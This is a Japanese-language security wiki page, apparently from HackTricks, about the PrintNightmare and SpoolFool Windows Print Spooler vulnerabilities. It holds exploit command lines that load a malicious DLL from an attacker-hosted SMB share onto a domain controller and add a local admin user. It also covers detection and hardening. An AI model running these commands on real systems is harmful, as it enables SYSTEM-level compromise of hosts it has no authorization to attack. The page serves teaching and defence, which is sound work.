# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmareは、Windows **Print Spooler**サービスにおける脆弱性のファミリーに付けられた総称であり、**SYSTEMとしての任意のコード実行**を可能にし、スプーラーがRPC経由で到達可能な場合には、**ドメインコントローラーやファイルサーバー上でのリモートコード実行（RCE）**を可能にします。最も広く悪用されているCVEは、**CVE-2021-1675**（最初はLPEとして分類）と**CVE-2021-34527**（完全なRCE）です。その後の問題として、**CVE-2021-34481（「Point & Print」）**や**CVE-2022-21999（「SpoolFool」）**があり、攻撃面はまだ閉じられていないことが証明されています。

---

## 1. 脆弱なコンポーネントとCVE

| 年 | CVE | 短い名前 | プリミティブ | ノート |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|「PrintNightmare #1」|LPE|2021年6月のCUでパッチが適用されたが、CVE-2021-34527によってバイパスされた|
|2021|CVE-2021-34527|「PrintNightmare」|RCE/LPE|AddPrinterDriverExは認証されたユーザーがリモート共有からドライバDLLをロードすることを許可|
|2021|CVE-2021-34481|「Point & Print」|LPE|非管理者ユーザーによる署名されていないドライバのインストール|
|2022|CVE-2022-21999|「SpoolFool」|LPE|任意のディレクトリ作成 → DLLの植え付け – 2021年のパッチ後も機能|

これらはすべて、**MS-RPRN / MS-PAR RPCメソッド**（`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`）または**Point & Print**内の信頼関係を悪用しています。

## 2. 悪用技術

### 2.1 リモートドメインコントローラーの侵害（CVE-2021-34527）

認証されたが**特権のない**ドメインユーザーは、次の方法でリモートスプーラー（通常はDC）上で**NT AUTHORITY\SYSTEM**として任意のDLLを実行できます：
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
人気のあるPoCには、**CVE-2021-1675.py**（Python/Impacket）、**SharpPrintNightmare.exe**（C#）、およびBenjamin Delpyの`misc::printnightmare / lsa::addsid`モジュールが含まれています**mimikatz**。

### 2.2 ローカル特権昇格（サポートされているWindows、2021-2024）

同じAPIは**ローカル**で呼び出され、`C:\Windows\System32\spool\drivers\x64\3\`からドライバーをロードしてSYSTEM特権を取得できます：
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – 2021年の修正を回避する

Microsoftの2021年のパッチはリモートドライバーの読み込みをブロックしましたが、**ディレクトリの権限を強化しませんでした**。SpoolFoolは`SpoolDirectory`パラメータを悪用して、`C:\Windows\System32\spool\drivers\`の下に任意のディレクトリを作成し、ペイロードDLLをドロップし、スプーラーにそれを読み込ませます：
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> このエクスプロイトは、2022年2月の更新前の完全にパッチが適用されたWindows 7 → Windows 11およびServer 2012R2 → 2022で動作します。

---

## 3. 検出とハンティング

* **イベントログ** – *Microsoft-Windows-PrintService/Operational*および*Admin*チャネルを有効にし、**イベントID 808**「印刷スプーラーがプラグインモジュールの読み込みに失敗しました」または**RpcAddPrinterDriverEx**メッセージを監視します。
* **Sysmon** – 親プロセスが**spoolsv.exe**のときに、`C:\Windows\System32\spool\drivers\*`内の`イベントID 7`（イメージが読み込まれました）または`11/23`（ファイルの書き込み/削除）。
* **プロセス系譜** – **spoolsv.exe**が`cmd.exe`、`rundll32.exe`、PowerShell、または署名されていないバイナリを生成するたびにアラートを発します。

## 4. 緩和とハードニング

1. **パッチを適用！** – Print SpoolerサービスがインストールされているすべてのWindowsホストに最新の累積更新を適用します。
2. **必要ない場所ではスプーラーを無効にする**、特にドメインコントローラーで：
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **リモート接続をブロック**しつつローカル印刷を許可する – グループポリシー：`コンピュータの構成 → 管理用テンプレート → プリンタ → Print Spoolerがクライアント接続を受け入れることを許可 = 無効`。
4. **Point & Printを制限**し、管理者のみがドライバーを追加できるようにレジストリ値を設定します：
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
詳細なガイダンスはMicrosoft KB5005652にあります。

---

## 5. 関連研究 / ツール

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) モジュール
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFoolエクスプロイトとその解説
* SpoolFoolおよびその他のスプーラーのバグに対する0patchマイクロパッチ

---

**さらなる読み物（外部）：** 2024年のウォークスルーブログ投稿をチェック – [PrintNightmare脆弱性の理解](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## 参考文献

* Microsoft – *KB5005652: 新しいPoint & Printデフォルトドライバーインストール動作の管理*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
